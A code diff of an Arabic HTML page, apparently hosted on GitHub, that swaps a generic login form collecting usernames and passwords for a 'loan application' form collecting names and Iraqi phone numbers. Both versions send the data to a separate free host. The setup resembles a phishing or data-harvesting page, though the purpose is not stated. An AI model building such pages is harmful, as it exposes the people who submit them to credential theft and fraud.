@@ -2,32 +2,57 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تسجيل الدخول الموحد</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تقديم طلب السلفة</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        button:hover { background-color: #0056b3; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .form-container { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); width: 100%; max-width: 450px; }
+        h2 { text-align: center; color: #333; margin-bottom: 25px; font-size: 24px; }
+        .form-group { margin-bottom: 20px; text-align: right; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #555; font-size: 14px; }
+        input[type="text"], input[type="tel"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; text-align: right; transition: border-color 0.3s; }
+        input[type="text"]:focus, input[type="tel"]:focus { border-color: #007bff; outline: none; }
+        button { width: 100%; padding: 14px; background-color: #2e7d32; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; transition: background-color 0.3s; margin-top: 10px; }
+        button:hover { background-color: #1b5e20; }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <h2>تسجيل الدخول</h2>
+<div class="form-container">
+    <h2>استمارة تقديم الطلب</h2>
     
-    <!-- 🌟 [تعديل أساسي]: استبدل الرابط أدناه برابط موقعك الفعلي على InfinityFree -->
+    <!-- 🌟 [تعديل أساسي]: استبدل الرابط أدناه بالرابط الفعلي لملف process.php الخاص بك على InfinityFree -->
     <form action="https://infinityfreeapp.com" method="POST" id="mainForm">
         
-        <!-- الحقول المخفية لتحديد صفحة التوجيه القادمة على GitHub -->
+        <!-- الحقل المخفي لتوجيه المستخدم بعد نجاح الإرسال على GitHub -->
         <input type="hidden" name="next_page" value="splash.html">
 
-        <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
-        <input type="password" name="password" placeholder="كلمة المرور" required>
+        <!-- حقل الاسم الكامل -->
+        <div class="form-group">
+            <label for="name">الاسم الكامل للمتقدم:</label>
+            <input type="text" id="name" name="name" placeholder="أدخل اسمك الثلاثي" required minlength="3">
+        </div>
+
+        <!-- حقل رقم الهاتف المحدث للنمط العراقي -->
+        <div class="form-group">
+            <label for="phone">رقم الهاتف (آسيا، زين، كورك):</label>
+            <input type="tel" id="phone" name="phone" placeholder="07XXXXXXXXX" pattern="^07\d{9}$" title="يجب أن يتكون رقم الهاتف من 11 رقماً ويبدأ بـ 07" required>
+        </div>
         
-        <button type="submit">دخول</button>
+        <button type="submit">إرسال الطلب الآن</button>
     </form>
 </div>
+
+<script>
+// كود جافاسكريبت بسيط لمنع كتابة كلمة "اسم" داخل حقل الاسم كما طلبت سابقاً
+document.getElementById('name').addEventListener('input', function(e) {
+    if (this.value.trim() === "اسم") {
+        this.setCustomValidity('يرجى كتابة اسمك الفعلي وليس كلمة "اسم"');
+    } else {
+        this.setCustomValidity('');
+    }
+});
+</script>
 
 </body>
 </html>
